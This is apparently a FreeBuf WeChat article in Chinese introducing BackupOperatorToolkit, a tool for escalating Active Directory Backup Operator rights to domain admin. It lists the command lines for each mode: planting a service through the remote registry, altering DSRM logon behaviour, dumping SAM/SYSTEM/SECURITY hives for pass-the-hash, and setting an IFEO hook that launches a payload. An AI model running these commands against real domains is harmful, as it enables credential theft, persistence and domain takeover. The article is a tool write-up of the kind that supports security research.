#  如何使用BackupOperatorToolkit将Backup Operator权限提升至域管理权限

原创 Alpha_h4ck  [ FreeBuf ](javascript:void\(0\);)

**FreeBuf** ![]()

微信号 freebuf

功能介绍 中国网络安全行业门户

____

___发表于_

收录于合集 #工具 115个

![]()  
  
![]()

##  

## **  关于BackupOperatorToolkit **

 BackupOperatorToolkit是一款针对域安全的强大工具，该工具引入了多种不同的技术，可以帮助广大研究人员从Backup
Operator用户权限提权至域管理员权限。  

##  **  工具下载 **

  
广大研究人员可以直接使用下列命令将该项目源码克隆至本地，并自行完成项目构建：

    
          * 
    
    
    
    git clone https://github.com/improsec/BackupOperatorToolkit.git

(向右滑动，查看更多)  
除此之外，我们也可以直接访问该项目的【Releases页面】下载该工具的与编译版本。  

##  **  工具使用 **

  
该工具简称BOT，并且拥有四种不同的操作模式。  
在运行该工具之前，请先运行下列命令：

    
          * 
    
    
    
    runas.exe /netonly /user:domain.dk\backupoperator powershell.exe

### (向右滑动，查看更多)

###  **  
**

###  **服务模式**

  
服务模式会在远程主机上创建一个服务，该服务将在主机重新启动时执行。该服务是通过修改远程注册表创建的，这个操作通过将“REG_OPTION_BACKUP_RESTORE”值传递给RegOpenKeyExA和RegSetValueExA来实现。  
需要注意的是，我们无法立即执行服务，因为服务控制管理器数据库“SERVICES_ACTIVE_database”会在启动时加载到内存中，并且只能使用本地管理员权限进行修改：

    
          * 
    
    
    
    .\BackupOperatorToolkit.exe SERVICE \\PATH\To\Service.exe \\TARGET.DOMAIN.DK SERVICENAME DISPLAYNAME DESCRIPTION

### (向右滑动，查看更多)

  
![]()

###  

###  **DSRM模式**

  
DSRM模式会在“HKLM\SYSTEM\CURRENTCONTROLET\CONTROL\LSA”中找到的DsrmAdminLogonBehavior注册表项设置为0、1或2。

>
> 将该值设置为0将只允许在恢复模式下使用DSRM帐户。将该值设置为1将允许在目录服务服务停止且NTDS解锁时使用DSRM帐户。将该值设置为2将允许DSRM帐户与网络身份验证（如WinRM）一起使用。

  
如果使用了DUMP模式，并且DSRM帐户已离线破解，请将该值设置为2，并使用将成为本地管理员的DSRM帐户登录到域控制器：

    
          * 
    
    
    
    .\BackupOperatorToolkit.exe DSRM \\TARGET.DOMAIN.DK 0||1||2

### (向右滑动，查看更多)

  
![]()

###  

###  **DUMP模式**

  
DUMP模式会式将SAM、SYSTEM和SECURITY配置单元转储到远程主机上的本地路径，或将文件上传到网络共享。  
一旦配置单元被转储，我们就可以使用域控制器哈希进行PtH，破解DSRM并启用网络身份验证，或者可能使用转储中的另一个帐户进行身份验证：

    
          * 
    
    
    
    .\BackupOperatorToolkit.exe DUMP \\PATH\To\Dump \\TARGET.DOMAIN.DK

### (向右滑动，查看更多)

  
![]()

###  

###  **IFEO模式**

  
IFEO模式（图像文件执行选项）将使我们能够在特定进程终止时运行应用程序。这可能会在SERVICE模式之前授权拿到Shell，以防目标主机被大量使用且很少重新启动：  

    
          * 
    
    
    
    .\BackupOperatorToolkit.exe IFEO notepad.exe \\Path\To\pwn.exe \\TARGET.DOMAIN.DK

### (向右滑动，查看更多)

  
![]()![]()![]()![]()

##  

##  **  项目地址 **

  
 **BackupOperatorToolkit** ：https://github.com/improsec/BackupOperatorToolkit

  

【FreeBuf粉丝交流群招新啦！

在这里，拓宽网安边界  

甲方安全建设干货；

乙方最新技术理念；

全球最新的网络安全资讯；

群内不定期开启各种抽奖活动；

FreeBuf盲盒、大象公仔......

扫码添加小蜜蜂微信回复“加群”，申请加入群聊】

![]()

  
![]()![]()

https://github.com/mpgn/BackupOperatorToDA  

  
![]()

[![]()](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247491072&idx=1&sn=bdd6cd39748e90730b953791646b2d2c&scene=21#wechat_redirect)

[![]()](http://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247491045&idx=1&sn=a83189d19a25e5b1c987b9489be65ae0&chksm=ce1ce77af96b6e6c18abb0820abb61fb35f0b40218622b9ae6612b5fcdfc1567ab22ba62da38&scene=21#wechat_redirect)

[![]()](http://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247491025&idx=1&sn=f7201066a67ed7cd03943b255fd8ef11&chksm=ce1ce74ef96b6e58bfd7a1747b9944e29c56419a7dc2f282c04ecc90bf6ddae1a46ec530740d&scene=21#wechat_redirect)

![]()

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

